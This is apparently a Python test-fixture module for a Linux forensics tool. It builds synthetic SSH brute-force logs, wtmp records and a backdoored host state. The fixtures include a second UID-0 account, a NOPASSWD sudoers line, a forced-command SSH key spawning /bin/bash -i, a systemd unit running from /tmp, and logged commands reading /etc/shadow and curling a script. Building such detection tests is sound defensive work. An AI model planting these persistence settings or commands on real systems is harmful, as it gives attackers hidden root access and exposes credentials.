"""Synthetic artifact builders.

Real evidence cannot be committed, so the test suite generates its own. These helpers
produce byte-accurate artifacts — the wtmp writer emits the same 384-byte records the
parser reads, so a round-trip test actually proves the layout is right.
"""

from __future__ import annotations

import struct
from datetime import datetime, timedelta, timezone
from pathlib import Path

from tracehound.parsers.wtmp import (
    BOOT_TIME,
    DEAD_PROCESS,
    RECORD_SIZE,
    USER_PROCESS,
)

_MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]


def syslog_line(
    ts: datetime,
    process: str,
    message: str,
    *,
    pid: int | None = None,
    host: str = "ip-172-31-35-28",
) -> str:
    stamp = f"{_MONTHS[ts.month - 1]} {ts.day:2d} {ts:%H:%M:%S}"
    tag = f"{process}[{pid}]" if pid is not None else process
    return f"{stamp} {host} {tag}: {message}"


def write_auth_log(path: Path, lines: list[str]) -> Path:
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


def utmp_record(
    *,
    rec_type: int,
    ts: datetime,
    user: str = "",
    line: str = "",
    host: str = "",
    pid: int = 0,
    session: int = 0,
) -> bytes:
    buf = bytearray(RECORD_SIZE)
    struct.pack_into("<I", buf, 0, rec_type)
    struct.pack_into("<I", buf, 4, pid)
    buf[8 : 8 + len(line.encode())] = line.encode()
    buf[44 : 44 + len(user.encode())] = user.encode()
    buf[76 : 76 + len(host.encode())] = host.encode()
    struct.pack_into("<I", buf, 336, session)
    struct.pack_into("<I", buf, 340, int(ts.timestamp()))
    struct.pack_into("<I", buf, 344, 0)
    return bytes(buf)


def write_wtmp(path: Path, records: list[bytes]) -> Path:
    path.write_bytes(b"".join(records))
    return path


# --- State artifacts (facts) --------------------------------------------------------


def _write(path: Path, text: str) -> Path:
    path.write_text(text if text.endswith("\n") else text + "\n", encoding="utf-8")
    return path


def write_passwd(path: Path, lines: list[str]) -> Path:
    """Each line is a full ``name:x:uid:gid:gecos:home:shell`` record."""
    return _write(path, "\n".join(lines))


def write_group(path: Path, lines: list[str]) -> Path:
    return _write(path, "\n".join(lines))


def write_sudoers(path: Path, lines: list[str]) -> Path:
    return _write(path, "\n".join(lines))


def write_authorized_keys(path: Path, lines: list[str]) -> Path:
    return _write(path, "\n".join(lines))


def write_unit(path: Path, sections: dict[str, dict[str, str]]) -> Path:
    """Render a systemd unit from ``{section: {key: value}}``."""
    blocks = []
    for section, entries in sections.items():
        rendered = "\n".join(f"{key}={value}" for key, value in entries.items())
        blocks.append(f"[{section}]\n{rendered}")
    return _write(path, "\n\n".join(blocks))


def backdoor_state_scenario(tmp: Path) -> Path:
    """A directory of state artifacts carrying one of every 0.6.0 finding.

    The shape mirrors a host an intruder has already established persistence on: a second
    UID-0 account, a passwordless sudoers grant, a forced-command SSH key, a service unit
    running from /tmp, and a daemon account handed a login shell. Every artifact also
    contains benign entries so the detections have to discriminate, not just fire.
    """
    root = tmp / "host"
    root.mkdir()

    write_passwd(
        root / "passwd",
        [
            "root:x:0:0:root:/root:/bin/bash",
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
            # backdoor #1: a second UID-0 account
            "systemd-network:x:0:0::/run/systemd:/bin/bash",
            # backdoor #2: a service account with a real shell
            "postfix:x:114:120::/var/spool/postfix:/bin/bash",
            "cyberjunkie:x:1002:1002::/home/cyberjunkie:/bin/bash",
        ],
    )
    write_group(
        root / "group",
        [
            "root:x:0:",
            "sudo:x:27:cyberjunkie",
            "www-data:x:33:",
        ],
    )
    write_sudoers(
        root / "sudoers",
        [
            "Defaults env_reset",
            "root ALL=(ALL:ALL) ALL",
            "%sudo ALL=(ALL:ALL) ALL",
            # backdoor #3: passwordless full sudo to a normal user
            "cyberjunkie ALL=(ALL) NOPASSWD: ALL",
        ],
    )
    ssh_dir = root / "home" / "cyberjunkie" / ".ssh"
    ssh_dir.mkdir(parents=True)
    write_authorized_keys(
        ssh_dir / "authorized_keys",
        [
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIProperKeyBlobHere admin@ops",
            # backdoor #4: a forced-command key that spawns a shell
            'command="/bin/bash -i" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBackdoorKeyBlob evil@kali',
        ],
    )
    # backdoor #5: a unit running from /tmp
    write_unit(
        root / "evil.service",
        {
            "Unit": {"Description": "System helper"},
            "Service": {"ExecStart": "/tmp/.cache/beacon --daemon", "User": "root"},
            "Install": {"WantedBy": "multi-user.target"},
        },
    )
    write_unit(
        root / "nginx.service",
        {
            "Unit": {"Description": "nginx"},
            "Service": {"ExecStart": "/usr/sbin/nginx -g 'daemon on;'", "User": "www-data"},
        },
    )
    return root


def brute_force_scenario(tmp: Path, *, year: int = 2024) -> tuple[Path, Path]:
    """Build an auth.log + wtmp pair describing a full SSH intrusion.

    The shape mirrors what a real credential attack leaves behind: a burst of failures
    against several usernames, an automated success, a separate interactive login, then
    persistence via a new sudo-capable account.
    """
    attacker = "65.2.161.68"
    admin = "203.101.190.9"
    base = datetime(year, 3, 6, 6, 31, 31, tzinfo=timezone.utc)
    lines: list[str] = []

    # Legitimate administrator, well before the attack.
    legit = base - timedelta(minutes=12)
    lines.append(
        syslog_line(
            legit, "sshd", f"Accepted password for root from {admin} port 42825 ssh2", pid=1465
        )
    )
    lines.append(
        syslog_line(
            legit,
            "sshd",
            "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)",
            pid=1465,
        )
    )

    # Credential attack: 4 usernames x 6 attempts.
    pid = 2325
    for offset, user in enumerate(["admin", "backup", "server_adm", "svc_account"]):
        for attempt in range(6):
            ts = base + timedelta(seconds=offset * 4 + attempt)
            lines.append(
                syslog_line(
                    ts,
                    "sshd",
                    f"Invalid user {user} from {attacker} port {46380 + pid % 500}",
                    pid=pid,
                )
            )
            lines.append(
                syslog_line(
                    ts,
                    "sshd",
                    f"Failed password for invalid user {user} from {attacker} port {46380 + pid % 500} ssh2",
                    pid=pid,
                )
            )
            pid += 1

    # Automated success, immediately torn down.
    auto = base + timedelta(seconds=9)
    lines.append(
        syslog_line(
            auto, "sshd", f"Accepted password for root from {attacker} port 34782 ssh2", pid=2411
        )
    )
    lines.append(
        syslog_line(
            auto,
            "sshd",
            "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)",
            pid=2411,
        )
    )
    lines.append(syslog_line(auto, "systemd-logind", "New session 34 of user root.", pid=411))
    lines.append(
        syslog_line(auto, "sshd", "pam_unix(sshd:session): session closed for user root", pid=2411)
    )

    # Interactive login 73 seconds later.
    manual = base + timedelta(seconds=73)
    lines.append(
        syslog_line(
            manual, "sshd", f"Accepted password for root from {attacker} port 53184 ssh2", pid=2491
        )
    )
    lines.append(syslog_line(manual, "systemd-logind", "New session 37 of user root.", pid=411))

    # Persistence.
    created = manual + timedelta(seconds=94)
    lines.append(
        syslog_line(created, "groupadd", "new group: name=cyberjunkie, GID=1002", pid=2586)
    )
    lines.append(
        syslog_line(
            created,
            "useradd",
            "new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash",
            pid=2592,
        )
    )
    lines.append(
        syslog_line(
            created + timedelta(seconds=8), "passwd", "password changed for cyberjunkie", pid=2603
        )
    )
    lines.append(
        syslog_line(
            created + timedelta(seconds=57),
            "usermod",
            "add 'cyberjunkie' to group 'sudo'",
            pid=2628,
        )
    )

    # Objectives via sudo.
    sudo_at = created + timedelta(seconds=219)
    lines.append(
        syslog_line(
            sudo_at,
            "sudo",
            "cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
        )
    )
    lines.append(
        syslog_line(
            sudo_at + timedelta(seconds=101),
            "sudo",
            "cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://example.invalid/linper.sh",
        )
    )

    auth_path = write_auth_log(tmp / "auth.log", lines)

    wtmp_path = write_wtmp(
        tmp / "wtmp",
        [
            utmp_record(
                rec_type=BOOT_TIME,
                ts=base - timedelta(minutes=14),
                user="reboot",
                line="~",
                host="6.2.0-1018-aws",
            ),
            utmp_record(
                rec_type=USER_PROCESS, ts=legit, user="root", line="pts/0", host=admin, pid=1583
            ),
            utmp_record(
                rec_type=USER_PROCESS,
                ts=manual + timedelta(seconds=1),
                user="root",
                line="pts/1",
                host=attacker,
                pid=2549,
            ),
            utmp_record(
                rec_type=DEAD_PROCESS, ts=manual + timedelta(seconds=353), line="pts/1", pid=2491
            ),
            utmp_record(
                rec_type=USER_PROCESS,
                ts=manual + timedelta(seconds=364),
                user="cyberjunkie",
                line="pts/1",
                host=attacker,
                pid=2667,
            ),
        ],
    )

    return auth_path, wtmp_path
